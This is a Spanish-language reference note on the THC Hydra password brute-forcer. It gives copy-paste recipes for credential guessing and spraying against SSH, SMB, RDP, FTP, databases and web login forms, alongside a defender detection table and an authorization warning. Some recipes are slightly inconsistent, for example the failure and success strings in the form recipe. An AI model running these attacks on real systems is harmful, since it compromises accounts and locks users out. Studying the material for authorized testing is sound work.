---
aliases:
  - THC-Hydra
  - Hydra
  - THC Hydra
  - Brute Force Hydra
tags: [tool/hydra]
tipo: herramienta
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[CrackMapExec Guía de Uso]]"
  - "[[smbclient Cliente de Línea de Comandos para SMBCIFS]]"
  - "[[Gobuster]]"
  - "[[WFuzz]]"
  - "[[Nmap Guía Completa]]"
  - "[[WPScan]]"
  - "[[Reconocimiento y Escaneo de Redes y Web]]"
  - "[[Enumeración de Servicios y CMS]]"
fuente: "https://github.com/vanhauser-thc/thc-hydra"
---

# THC Hydra: Fuerza Bruta Multiservicio

**THC Hydra** es un brute-forcer de credenciales **paralelizado** y extensible por módulos: un solo motor gestiona más de 50 protocolos (SSH, FTP, HTTP/HTTPS y sus formularios, SMB, RDP, VNC, Telnet, MySQL, PostgreSQL, Oracle, SMTP/IMAP/POP3, LDAP, Redis, MSSQL…). Dada una IP, un servicio y dos listas (usuarios/contraseñas), prueba combinaciones en paralelo hasta encontrar un par válido — y para los servicios web, modela el flujo completo de login (formulario, redirect, cadena de fallo).

> [!info] Cuándo usar Hydra y cuándo no
> Hydra ataca **autenticación por contraseña** en servicios de red. No descubre usuarios (para eso hay enum previa: `Nmap` scripts, [[Enumeración de Servicios y CMS]]), no ataca APIs tokenizadas (eso es [[Abuso de APIs]]), no prueba credenciales en un solo formulario con CSRF/2FA (eso es una prueba manual con [[Burp Suite Escaneo Dirigido y Estructuras de Datos No Estándar]]). Su sweet spot: servicios clásicos con login y sin rate limit, en laboratorio o con alcance firmado. En Windows, para SMB/WinRM/RDP conviene mirar primero [[CrackMapExec Guía de Uso]] — hace pass-the-hash, spraying y persistencia además de fuerza bruta.

## Instalación

```bash
# Kali / Debian (siempre en los repos)
sudo apt update && sudo apt install hydra
hydra -h          # banner + lista de módulos soportados en TU versión

# Desde fuente (últimos módulos/fixes)
sudo apt install build-essential libssl-dev libssh-dev libmysqlclient-dev
git clone https://github.com/vanhauser-thc/thc-hydra.git && cd thc-hydra
./configure && make -j$(nproc) && sudo make install
```

> [!tip] La lista de módulos es la de tu binario
> `hydra -h` imprime la tabla de servicios soportados (`ssh`, `smb`, `rdp`, `http-get`, `http-post-form`, `ldap2`, `mssql`, `oracle`, `vnc`, `redis`… — varía entre versiones y compilaciones: sin librerías de desarrollo, compilan menos módulos). Antes de un ataque, verifica que el servicio objetivo tenga módulo: **si no está en `hydra -h`, Hydra no lo ataca.**

## Sintaxis general

```text
hydra [opciones] objetivo servicio://...
```

- `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10`
- El **protocolo se escribe como URL** (`ssh://`, `ftp://`, `http-post-form://`), con puerto por defecto o `-s`.
- El objetivo puede ser un host, o `-M targets.txt` para lista.

## Tabla de flags

### Selección de objetivo

| Flag | Significado | Ejemplo |
|---|---|---|
| `-M, --list` | Archivo con un target por línea (un servicio, muchos hosts) | `-M hosts.txt` |
| `-s, --port` | Puerto (si no es el default del módulo) | `-s 2222` |
| `-S` | Usar SSL/TLS (`https://`, `smtps://`, `imaps://`) | `-S -s 443` |
| `-4` / `-6` | Forzar IPv4 / IPv6 | `-4` |
| `-O` | Método de activación antiguo (compatibilidad con servidores muy viejos) | `-O` |

### Credenciales

| Flag | Significado | Ejemplo |
|---|---|---|
| `-l, --login` | Un usuario fijo | `-l admin` |
| `-L, --logins` | Lista de usuarios | `-L users.txt` |
| `-p, --pass` | Una contraseña fija | `-p admin123` |
| `-P, --passes` | Lista de contraseñas | `-P rockyou.txt` |
| `-C, --cred-file` | Combo `usuario:contraseña` por línea (ataque directo, sin matriz) | `-C combos.txt` |
| `-e, --extra` | Trucos extra: `n` = prueba contraseña nula, `s` = prueba el login como contraseña, `r` = login invertido (admin/admin) | `-e nsr` |
| `-x, --load` | **Genera** contraseñas: `-x min:max:charset` (charset: `a` alfa, `A` alfa-mayúsc, `1` dígitos, `@` símbolos, `^` mixto) | `-x 6:8:a1` |
| `-u, --uncommon` | Invierte el orden: para cada contraseña prueba **todos** los usuarios (mejor para objetivos con un solo intento por sesión) | `-u` |

### Rendimiento y estabilidad

| Flag | Significado | Ejemplo |
|---|---|---|
| `-t, --tasks` | Tareas paralelas **por target y por puerto** (defecto: 16 en la mayoría de módulos; varios módulos — smtp, telnet… — corren con 1 y Hydra lo anuncia) | `-t 4` |
| `-w, --wait` | Segundos de espera de conexión (timeout del handshake TCP) | `-w 30` |
| `-W, --wait-after` | Pausa entre intentos dentro de la misma tarea | `-W 5` |

> [!warning] `-t` alto es la causa #1 de falsos positivos y bloqueos
> En módulos web (`http-form`), `-t 16` contra un login real produce respuestas intermitentes que Hydra interpreta como "válidas". Para formularios usa `-t 4` como máximo y **verifica siempre** el par con `-V` (imprime cada intento). En SSH, `-t` alto dispara `Too many authentication failures` del servidor: `-t 1`–`4`.

### Control de la sesión

| Flag | Significado | Ejemplo |
|---|---|---|
| `-f, --exit-on-found` | Para al encontrar el **primer** par válido de cada target (por defecto: el primero por servidor/puerto) | `-f` |
| `-F` | Para solo cuando se han agotado **todos** los targets de `-M` | `-F` |
| `-I, --ignore-rest` | Ignora/borra el archivo de restauración `hydra.restore` existente y arranca limpio | `-I` |
| `-R, --restore` | **Reanuda** la última sesión desde `hydra.restore` (se guarda automáticamente al interrumpir) | `hydra -R` |
| `-d, --debug` | Debug: muestra los intentos y el tráfico del módulo | `-d` |
| `-v` / `-V` | Verbose (`-V`: imprime cada intento — indispensable para afinar formularios) | `-V` |

### Salida

| Flag | Significado | Ejemplo |
|---|---|---|
| `-o, --output` | Guarda resultados en archivo (texto por defecto) | `-o found.txt` |
| `-b, --format` | Formato del archivo: `text` (defecto), `json` (compacto), `jsonv` (verbose), `xml`, `xmlv` | `-b json` |

### Módulos

| Flag | Significado | Ejemplo |
|---|---|---|
| `-m, --module-opt` | Opciones del módulo (`clave=valor`, repetible) | `-m "domain=CORP"` |
| `-U, --module-help` | Ayuda específica del módulo | `-U http-post-form` |

> [!tip] `-U` antes de cada servicio nuevo
> Cada módulo tiene parámetros propios (`-m`). `hydra -U ldap2`, `hydra -U http-form` o `hydra -U smb` muestra la sintaxis exacta de *esa* versión — la única fuente fiable, porque cambia entre releases.

## Catálogo de protocolos (los habituales)

| Servicio | Módulo (Hydra) | Puerto | Notas de uso |
|---|---|---|---|
| SSH | `ssh` | 22 | `-t 1`–`4`; sin pass-the-hash, solo contraseñas |
| SSH con clave | `sshkey` | 22 | `-P` de ficheros de clave privada |
| FTP | `ftp` | 21 | `-e nsr` rinde mucho |
| FTPS | `ftps` / `ftp -S` | 990 | Explícito/implícito |
| HTTP (Basic) | `http-get` / `http-head` | 80/443 | `-S` para TLS; `-l/-L -p/-P` normal |
| HTTP form | `http-get-form`, `http-post-form` | 80/443 | Sintaxis especial abajo; `-t 4` |
| HTTP proxy | `http-proxy` | 8080 | Proxy con credenciales |
| SMB (1/2/3) | `smb` | 445 | Alternativa: [[CrackMapExec Guía de Uso]], [[smbclient Cliente de Línea de Comandos para SMBCIFS]] |
| RDP | `rdp` | 3389 | Lento; `-t 1` recomendado |
| VNC | `vnc` | 5900 | Solo contraseña (sin usuario) |
| Telnet | `telnet` | 23 | Interactivo: `-t 1` |
| MySQL | `mysql` | 3306 | — |
| PostgreSQL | `postgres` | 5432 | — |
| MSSQL | `mssql` | 1433 | — |
| Oracle | `oracle`, `oracle-listener` | 1521 | `-m SID=orcl` |
| SMTP / SMTPS | `smtp` | 25/465 | Enumera usuarios con `-L` antes |
| IMAP / IMAPS | `imap` | 143/993 | — |
| POP3 / POP3S | `pop3` | 110/995 | — |
| LDAP | `ldap`, `ldap2`, `ldap-all` | 389/636 | `-m domain=DOM` |
| Redis | `redis` | 6379 | Sin auth a menudo: `-p ""` |
| NFS | `nfs` | 2049 | — |
| SIP | `sip` | 5060 | — |
| PCAnywhere | `pcanywhere` | 5631 | Legacy |

## Formularios web: la sintaxis `http-post-form`

```text
ruta:user=^USER^&pass=^PASS^:F=clave_de_fallo[:O=redirección[:H=header]]
```

| Pieza | Significado |
|---|---|
| `ruta` | Path del login (`/login.php`) — la URL va en el target, la ruta en el módulo |
| `user=^USER^&pass=^PASS^` | Cuerpo POST con los marcadores `^USER^`/`^PASS^` (o `username=`/`password=`, según el form) |
| `F=...` | Cadena que aparece en la respuesta **fallo** (p. ej. `F=Invalid login`) |
| `O=...` | (opcional) Patrón/URL que indica **éxito** (redirect a `/dashboard`) |
| `H=...` | (opcional) Header adicional, p. ej. un token CSRF si lo tienes fijo |

Ejemplo completo y comentado en Recetas.

## Workflow: ataque ordenado

1. **Confirmar servicio y puerto** — `nmap -sV -p- target` (ver [[Nmap Guía Completa]]).
2. **Reducir usuarios** — enum primero: SNMP/SMTP/author pages/`--enumerate u` de [[WPScan]]; nunca arranques con `admin` a ciegas si puedes enumerar.
3. **Elegir modelo**: un usuario + diccionario (`-l -P`), lista + una pass (`-L -p`, útil con credencial default filtrada), o combo (`-C`).
4. **Ajustar ritmo al servicio** (`-t` conservador, `-w` generoso) y poner `-o -b json`.
5. **Probar en seco el módulo** con `-V -t 1 -l admin -p wrongpass` — validar que "fallo" se detecta correctamente.
6. **Lanzar acotado** (`-f`) y **verificar** el par hallado manualmente (curl/RDP/smbclient).
7. **Documentar** el par en el informe con hora, servicio y modo de detección.

## Recetas (copy-paste)

```bash
# 1. SSH: un usuario, diccionario de contraseñas, para al acertar
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -f -o hydra_ssh.txt ssh://10.10.10.10

# 2. SSH: lista de usuarios con una pass filtrada (spray ligero)
hydra -L users.txt -p 'Summer2026!' -t 1 -f ssh://10.10.10.10

# 3. FTP con trucos extra (null pass, login-as-pass, reverse)
hydra -L users.txt -P passwords.txt -e nsr -t 8 ftp://10.10.10.10

# 4. SMB: usuario único contra la lista (Windows)
hydra -l administrator -P /usr/share/wordlists/rockyou.txt -t 1 -f smb://10.10.10.20

# 5. HTTP Basic sobre TLS en puerto alternativo
hydra -l admin -P passwords.txt -S -s 8443 https-get://target.local/manager

# 6. Formulario POST (DVWA-like) — inspecciona el form primero
hydra -l admin -P passwords.txt -t 4 -V \
  http-post-form://target.local/login.php:"username=^USER^&password=^PASS^&Login=Login:Login failed:F=/dashboard"

# 7. Mismo form por GET + redirect de éxito
hydra -l admin -P passwords.txt -t 4 \
  http-get-form://target.local/auth:":user=^USER^&pass=^PASS^:F=denied:O=/panel"

# 8. Combo usuario:pass (de un dump filtrado) contra RDP
hydra -C combos.txt -t 1 -f rdp://10.10.10.30

# 9. Contra muchos hosts y salida JSON
hydra -L users.txt -P passwords.txt -M hosts.txt -t 4 -f -o resultados.json -b json smb://10.10.10.0

# 10. Generar passs al vuelo (6-8 chars alfanuméricos) contra MySQL
hydra -l root -x 6:8:a1 -t 4 mysql://10.10.10.40
```

**Detalle de la receta 6:** la ruta del form va en el target (`.../login.php`), los campos en el módulo. `F=Login failed` debe ser un string que **solo** aparezca en el fallo real (pruébalo con `curl -d` a mano); `O=/dashboard` cubre el caso de que el servidor no muestre texto de error sino un redirect. Sin `-V` y `-t 4` no depures un form mal definido.

## Interpretación de la salida

```
[ATACK]  target (smb) - Login: admin   Password: admin123   <- (simplificado)
[DATA] max 1 task per 1 server, overall 1 task, 1 login try per 1 password
[STATUS] attack finished for 10.10.10.20 (waiting for children)
[80][http-post-form] host: target.local   login: admin   password: admin123
1 of 1 target successfully completed, 1 valid password found
```

| Elemento | Qué significa |
|---|---|
| `[DATA] max N tasks per M server` | Cómo quedó el paralelismo realmente aplicado — si es 1 aunque pediste 16, el módulo lo limitó |
| Línea final `[80][http-post-form] host … login … password …` | **Par hallado** (formato `puerto][módulo`) |
| `0 valid passwords found` | Ningún par; revisa F=, listas y si el servicio admite lockouts |
| `[ERROR] child …` reiterados | Timeouts/conexiones caídas: sube `-w`, baja `-t` |
| Varias líneas "valid" con el mismo form | Falsos positivos: afina `F=`/`O=` (ver warning de `-t`) |

## Detección y contramedidas (defensor)

| Señal | Dónde se ve | Mitigación |
|---|---|---|
| Cientos de intentos fallidos desde una IP | `auth.log`, `/var/log/secure`, IIS/Exchange logs | Fail2ban / Account Lockout Policy (p. ej. 5 fallos → 15 min) |
| Múltiples usuarios con la misma IP (spray) | Correlación de logs por origen | Bloqueo por IP + CAPTCHA tras N fallos |
| Intentos a muchos usuarios de un mismo dominio (LDAP/SMTP) | Logs AD (4625), SIEM | `Smart Lockout` de AD, alertas por velocidad |
| Patrones `-e nsr` (login = pass, pass nula) | Logs: intentos `admin/admin` | Bloquear credenciales débiles por política, no solo por WAF |
| SSH: `Too many authentication failures` repetido | sshd | `MaxAuthTries 3`, `PermitRootLogin no`, keys-only |
| Ráfaga con UA/Tooling característica (Hydra no "navega") | WAF | Rate limit por cuenta (no solo por IP): el spray real distribuye |
| 429/lockout que cortan el ataque | — | La defensa ya actuó: registrar el intento y no reintentar |

> [!warning] Ética, lockouts y rate limit
> Un ataque Hydra mal calibrado **bloquea cuentas reales** (especialmente SMB/RDP/AD: account lockout). Eso es un impacto de disponibilidad — en clientes, define lockouts **ficticios** en el alcance, coordina ventanas, y arranca con `-t 1`. El "spray" prudente (pocas passs, muchos usuarios, pausas de minutos) es más eficaz y menos dañino que la matriz completa. Sin autorización escrita, esto no se ejecuta. Nada de esto se documenta sin permiso — la referencia es solo para estudio.

## Errores comunes (mensaje → arreglo)

1. **`[ERROR] restore file (hydra.restore) found. Use -I to ignore/delete it`** — quedó una sesión anterior.
   → Continuar con `hydra -R`, o empezar de cero con `-I`.
2. **`[ERROR] the module service:// requires ... / invalid parameters`** — módulo mal invocado (falta ruta, puerto o `-m`).
   → `hydra -U <módulo>` y copiar la sintaxis exacta.
3. **`[ERROR] Service {} does not support ...` o módulo inexistente** — no está compilado en tu versión.
   → `hydra -h` para la lista real; recompilar desde fuente si hace falta.
4. **`Too many authentication failures` / corte inmediato en SSH** — `-t` demasiado alto o el servidor cuenta intentos.
   → `-t 1`, `-w 20`; en lab subir `MaxAuthTries` solo si controlas el server.
5. **Falsos positivos en formularios ("valid" que no lo es)** — el servidor devuelve 200 ante cualquier cosa, o falta `F=`.
   → Baseline con `curl`, ajustar `F=`/`O=`, `-t 4` y verificación manual obligatoria.
6. **`[ERROR] ... Connection refused/timeout` masivos** — filtro de red o puerto equivocado.
   → Reconfirmar con `nc -zv`/nmap; si hay firewall de rate limit, `-w` mayor y menos tareas.
7. **`Invalid COMBO file` con `-C`** — el archivo no es `user:pass` por línea o tiene BOM/space.
   → `awk -F: '{print $1":"$2}'` para limpiar, sin líneas vacías.
8. **`[WARNING] ... many servers, consider using -M ...`** — scaneas rangos de a una IP.
   → Usar `-M hosts.txt` para planificar bien.

## Hydra vs hermanos

| Criterio | **Hydra** | Medusa | Ncrack | ffuf | [[CrackMapExec Guía de Uso]] |
|---|---|---|---|---|---|
| Módulos/protocolos | **50+** | ~30 | ~15 | Web puro | SMB/WinRM/SSH/RDP/MSSQL… |
| Velocidad | Muy alta (select/event) | Alta (thread por target) | Alta (dyna engine) | **Máxima** (web) | Alta, orientada a AD |
| Pass-the-hash | No | No | No | No | **Sí** |
| Spraying/OPSEC AD | Básico | Básico | Regular | No | **Excelente** (`--continue-on-success`, spool) |
| Fuerza bruta web-form | Sí (módulos form) | Limitada | No | **Sí** (mejor) | No |
| Sesión/reanudación | `hydra.restore` (`-R`) | No | Auto-retry | No | No |
| Salida | texto/json/xml | texto | texto | JSON | texto/json |
| Curva de aprendizaje | Media (sintaxis por módulo) | Baja | Baja | Baja | Media-alta |

Regla práctica: **web → ffuf/[[WFuzz]]; red clásica → Hydra; Active Directory → CrackMapExec; lab Windows legacy → Ncrack.**

## Cheatsheet

```bash
hydra -h                                        # módulos disponibles
hydra -U http-post-form                         # ayuda del módulo
hydra -l admin -P rockyou.txt -t 4 -f ssh://10.10.10.10
hydra -L users.txt -p 'Pass1!' -t 1 ssh://10.10.10.10
hydra -L users.txt -P pass.txt -e nsr ftp://10.10.10.10
hydra -l admin -P pass.txt smb://10.10.10.20
hydra -l admin -P pass.txt -t 1 rdp://10.10.10.20
hydra -l admin -P pass.txt -t 4 http-post-form://t/login.php:"user=^USER^&pass=^PASS^:F=error"
hydra -C combos.txt -f -o out.txt -b json rdp://10.10.10.30
hydra -R                    # reanudar
hydra -I ...                # ignorar sesión previa
```

| Tarea | Comando |
|---|---|
| Usuario fijo + diccionario | `-l user -P list` |
| Lista + pass fija (spray) | `-L users -p pass -t 1` |
| Combos | `-C file` |
| Null/pass-as-login | `-e nsr` |
| Generar passs | `-x min:max:charset` |
| Para al acertar | `-f` |
| Salida automatable | `-o out -b json` |
| Reanudar | `-R` / limpiar `-I` |

## Referencias

- [Repositorio oficial (vanhauser-thc/thc-hydra)](https://github.com/vanhauser-thc/thc-hydra) — módulos, compilación y changelog
- `hydra -h` y `hydra -U <módulo>` — referencia viva en tu instalación
- HackTricks — *Brute Force* (guías por servicio con sintaxis exacta de formularios)

## Relacionadas

- [[CrackMapExec Guía de Uso]] — vía preferente en Windows/AD (spray, PTH)
- [[smbclient Cliente de Línea de Comandos para SMBCIFS]] — verificar manualmente credenciales SMB halladas
- [[WFuzz]] / [[Gobuster]] — fuerza bruta y fuzzing del lado web (formularios y rutas)
- [[WPScan]] — brute force con throttling específico para WordPress
- [[Nmap Guía Completa]] — confirmar servicios/versions antes de elegir módulo
- [[Enumeración de Servicios y CMS]] / [[Reconocimiento y Escaneo de Redes y Web]] — la fase metodológica en la que encaja
- [[Abuso de APIs]] / [[Inyección NoSQL]] — cuando el objetivo no es un login clásico
